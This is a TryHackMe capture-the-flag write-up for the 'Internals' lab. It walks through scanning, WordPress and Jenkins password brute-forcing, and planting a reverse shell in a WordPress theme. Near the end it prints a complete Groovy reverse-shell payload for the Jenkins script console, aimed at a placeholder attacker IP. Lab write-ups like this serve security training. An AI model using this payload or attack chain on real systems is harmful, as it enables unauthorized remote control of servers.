---
Title: "Internals — TryHackMe Writeup"
Author: Cankun Wang
date: 2025-12-1
tags: [tryhackme, writeup]
---

#Task

Having accepted the project, you are provided with the client assessment environment.  Secure the User and Root flags and submit them to the dashboard as proof of exploitation.

#Enumeration

We start with a normal nmap scan for all ports.

![image-20251201101906823](./assets/image-20251201101906823.png)

And I tried to use -O to detect more info about host.

![image-20251201101932079](./assets/image-20251201101932079.png)

Let's view the target website.

![image-20251201104753999](./assets/image-20251201104753999.png)

Default page of ubuntu apache2...

Let's do a dir enumeration.

![image-20251201105000006](./assets/image-20251201105000006.png)

We find several interesting pages.

We find two login page. And an information page about phpmylogin.

I want to use nuclei to scan for any possible vulnerabilities in these two directories.

![image-20251201110209860](./assets/image-20251201110209860.png)

This is the scan for /phpmyadmin

![image-20251201110921365](./assets/image-20251201110921365.png)

The scan for wordpress find a potential CVE.

So we better start from /wordpress

We tried to figure out whether /wordpress is truly vulnerable to that CVE, so I run the script of that CVE to track the results.

![image-20251201125859839](./assets/image-20251201125859839.png)

However, the result shows that this may be a mistake made by nuclei.

But /wordpress is indeed a possible vulnerable pages. We need a more specific scan.

![image-20251201130926338](./assets/image-20251201130926338.png)

I run a wpscan for the /wordpress, however, it seems there is no vulnerabilities. But the wordpress version is outdated and should be vulnerable. So I changed the directory.

![image-20251201131030956](./assets/image-20251201131030956.png)

I run the nuclei for the /blog as well as the wpscan.

![image-20251201131102763](./assets/image-20251201131102763.png)

Now we have some clues.

![image-20251201131117897](./assets/image-20251201131117897.png)

We can try the brute force.

![image-20251201131314441](./assets/image-20251201131314441.png)

![image-20251201131406938](./assets/image-20251201131406938.png)

We find the credential.

Now let's try to login to /blog/wp-login.php

Remember if you can't open the /blog/wp-login.php after type in the credentials, remember to update your host file and link your target ip with internal.thm

Now, we are in.

![image-20251201132721462](./assets/image-20251201132721462.png)

![image-20251201132753902](./assets/image-20251201132753902.png)

We go to the Appearance and find the 404.php.

![image-20251201162242810](./assets/image-20251201162242810.png)

Insert a reverse php shell code,

Then try to trigger the 404 of the wordpress.(Remember not the apache 404 page)

---

http://internal.thm/blog/?p=999999

---

Now, we get a shell.

![image-20251201163219797](./assets/image-20251201163219797.png)

#Escalation privilege

![image-20251201163712844](./assets/image-20251201163712844.png)

This is the target directory structures.

![image-20251201163853656](./assets/image-20251201163853656.png)

Check for other users...

![image-20251201164358195](./assets/image-20251201164358195.png)

After we check the /opt directory, we find a file which contains the credentials.

SSH~~~

Try the ssh login.

![image-20251201164652001](./assets/image-20251201164652001.png)

Now we are in. Let's check for possible escalation privilege path.(You can already find the user.txt, so I just skip this)

![image-20251201164849666](./assets/image-20251201164849666.png)

![image-20251201164900568](./assets/image-20251201164900568.png)

Check for suid~~~

![image-20251201164916494](./assets/image-20251201164916494.png)

We find two possible pathes---pkexec and at

But let's keep searching for other pathes first.

![image-20251201165031039](./assets/image-20251201165031039.png)

Sudo is not availble.

![image-20251201165049356](./assets/image-20251201165049356.png)

No cronjob availble.

So let's go back to these binary files first.

According to GTFO bins~~~

![image-20251201165133819](./assets/image-20251201165133819.png)

![image-20251201165152740](./assets/image-20251201165152740.png)

These two is for the at.md and pkexec.md

![image-20251201165701927](./assets/image-20251201165701927.png)

However, both of them has already patched.

We need to find another path.

![image-20251201171343682](./assets/image-20251201171343682.png)

When we exploring the /home directory, we find a txt file called jenkins.txt

![image-20251201171420143](./assets/image-20251201171420143.png)

There is a Jenkins running, however, the ip means it only listening on the docker or internal.

We need to do a port forwarding.

![image-20251201171721887](./assets/image-20251201171721887.png)

First, we make sure it is active.

![image-20251201173539021](./assets/image-20251201173539021.png)

Next, we use a python script to start a reverse port forwarding.

![image-20251201173611426](./assets/image-20251201173611426.png)

Then we are able to see the page in browser.

I tried aubreanna and its password, but it is not valid. So we may need to brute force this.

![image-20251201174636819](./assets/image-20251201174636819.png)

We first make sure the error message, then start brute forcing.

![image-20251201185506322](./assets/image-20251201185506322.png)

This step will take a long time. 

Username:admin

Password: spongebob

Now let's login.

![image-20251201190349991](./assets/image-20251201190349991.png)

![image-20251201190828137](./assets/image-20251201190828137.png)

I opened the script console, and want to run a command to establish a reverse shell.

This is the payload.

---

String host="your ip";
int port=4444;
String cmd="/bin/bash";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();
Socket s=new Socket(host,port);
InputStream pi=p.getInputStream(), pe=p.getErrorStream(), si=s.getInputStream();
OutputStream po=p.getOutputStream(), so=s.getOutputStream();
while(!s.isClosed()){
    while(pi.available()>0) so.write(pi.read());
    while(pe.available()>0) so.write(pe.read());
    while(si.available()>0) po.write(si.read());
    po.flush();
    so.flush();
    Thread.sleep(50);
}
p.destroy();
s.close();

---

![image-20251201191115707](./assets/image-20251201191115707.png)

Now we have a shell as jenkins.

![image-20251201191158636](./assets/image-20251201191158636.png)

After looking at the /opt, we find a note.txt and there is root credential.

![image-20251201191310904](./assets/image-20251201191310904.png)

SSH login! We are root now.

Thanks for reading!

